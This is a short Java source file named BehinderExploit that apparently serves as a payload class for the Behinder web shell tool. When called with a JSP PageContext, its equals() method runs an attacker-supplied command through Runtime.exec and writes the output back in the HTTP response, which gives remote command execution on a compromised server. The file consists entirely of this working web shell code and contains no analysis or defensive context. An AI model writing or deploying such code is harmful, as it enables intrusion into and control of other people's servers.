package com.feihong.asm;

import javax.servlet.jsp.PageContext;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class BehinderExploit{
    private String str;

    @Override
    public boolean equals(Object obj) {
        if(obj instanceof PageContext){
            PageContext page = (PageContext)obj;
            String result = "";
            try{
                InputStream inputStream = Runtime.getRuntime().exec(str.split(",",3)).getInputStream();
                int len = 0;
                byte[] bytes = new byte[1024];
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                while((len = inputStream.read(bytes)) != -1){
                    baos.write(bytes, 0, len);
                }
                result = baos.toString();
                inputStream.close();
                baos.close();
            }catch (Exception e){
                e.printStackTrace();
            }

            try {
                page.getResponse().getWriter().print(result.trim());
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        return super.equals(obj);
    }
}
